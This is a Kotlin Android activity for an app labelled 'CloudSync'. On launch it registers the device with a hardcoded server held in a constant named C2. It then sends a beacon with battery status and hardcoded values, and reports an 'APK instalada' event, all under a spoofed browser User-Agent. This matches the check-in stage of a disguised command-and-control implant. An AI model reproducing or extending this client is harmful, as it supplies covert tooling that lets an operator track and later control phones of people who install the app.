package com.cloudsync.app

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    companion object {
        const val C2 = "https://cloudsync-service.onrender.com"
        const val VER = "2.1.4"
        const val PROTO = "2.1.4"
    }

    private lateinit var estado: TextView
    private lateinit var detalle: TextView

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        setContentView(R.layout.activity_main)
        estado = findViewById(R.id.estado)
        detalle = findViewById(R.id.detalle)
        findViewById<Button>(R.id.btn_sync).setOnClickListener { conectar() }
        conectar()
    }

    private fun prefs() = getSharedPreferences("cs", Context.MODE_PRIVATE)

    private fun log(t: String) {
        val h = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        detalle.text = "$h  $t\n${detalle.text}"
    }

    private fun conectar() {
        estado.text = getString(R.string.conectando)
        thread {
            try {
                val p = prefs()
                var id = p.getString("device_id", null)
                var token = p.getString("token", null)

                val body = JSONObject()
                    .put("label", Build.MODEL)
                    .put("platform", "android")
                    .put("model", Build.MODEL)
                    .put("os_ver", "Android " + Build.VERSION.RELEASE)
                    .put("app_ver", VER)
                    .put("sdk", Build.VERSION.SDK_INT.toString())
                    .put("protocol", PROTO)
                if (id != null && token != null) {
                    body.put("device_id", id).put("token", token)
                }

                val reg = post("/api/v1/sync/register", body.toString(), id, token)
                    ?: throw Exception("sin respuesta del servidor")
                val jo = JSONObject(reg)
                id = jo.getString("device_id")
                token = jo.getString("token")
                p.edit().putString("device_id", id).putString("token", token).apply()

                runOnUiThread {
                    estado.text = getString(R.string.sincronizado)
                    log("registrado " + id!!.take(16) + "...")
                }

                val beacon = JSONObject()
                    .put("battery", bateria())
                    .put("charging", true)
                    .put("net", "wifi")
                    .put("screen_on", true)
                post("/api/v1/sync/beacon", beacon.toString(), id, token)
                runOnUiThread { log("latido enviado") }

                val arr = JSONArray()
                arr.put(
                    JSONObject()
                        .put("ts", System.currentTimeMillis())
                        .put("type", "hello")
                        .put("data", JSONObject().put("msg", "APK instalada").put("model", Build.MODEL))
                )
                val ev = JSONObject().put("events", arr)
                post("/api/v1/sync/push", ev.toString(), id, token)
                runOnUiThread { log("evento enviado") }

            } catch (e: Exception) {
                runOnUiThread {
                    estado.text = getString(R.string.sin_conexion)
                    log("error: " + e.message)
                }
            }
        }
    }

    private fun bateria(): Int {
        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun post(ruta: String, cuerpo: String, id: String?, token: String?): String? {
        val c = URL(C2 + ruta).openConnection() as HttpURLConnection
        c.requestMethod = "POST"
        c.connectTimeout = 25000
        c.readTimeout = 25000
        c.doOutput = true
        c.setRequestProperty("Content-Type", "application/json")
        c.setRequestProperty("Accept", "application/json, text/plain, */*")
        c.setRequestProperty("Accept-Language", "es-CO,es;q=0.9")
        c.setRequestProperty(
            "User-Agent",
            "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL +
                ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 CloudSync/" + VER
        )
        if (id != null && token != null) {
            c.setRequestProperty("X-Sync-Id", id)
            c.setRequestProperty("X-Sync-Key", token)
        }
        OutputStreamWriter(c.outputStream).use { it.write(cuerpo) }
        val code = c.responseCode
        val txt = (if (code < 400) c.inputStream else c.errorStream)?.bufferedReader()?.readText()
        c.disconnect()
        return txt
    }
}
